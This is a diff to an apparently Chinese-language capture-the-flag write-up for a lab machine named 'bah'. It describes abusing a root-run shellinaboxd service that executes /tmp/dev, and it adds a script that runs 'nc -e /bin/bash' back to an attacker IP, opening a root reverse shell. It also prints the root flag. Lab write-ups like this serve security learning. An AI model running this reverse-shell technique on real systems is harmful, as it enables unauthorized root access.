@@ -252,3 +252,13 @@ d
 2024/04/19 03:14:06 CMD: UID=0     PID=384    | 
 ```
 这里可以看到一个shellinaboxd的命令。 -s 是用于启动服务。程序中的/devel将由用户root调用目标机器的/tmp/dev。因此，我们可以在 /tmp 上创建一个名为“dev”的可执行脚本，这将为我们提供一个反向 shell。
+```c
+qpmadmin@bah:/tmp$ nano dev                                                                                                                                      
+qpmadmin@bah:/tmp$ cat dev                                                                
+#!/bin/bash                                                 
+nc -e /bin/bash 192.168.44.128 9001                                                                                                                              
+qpmadmin@bah:/tmp$ chmod +x dev           
+```
+kali上监听，访问http://party.bah.hmv/devel/即可！！！
+cat /root/root.txt
+HMVssssshell323
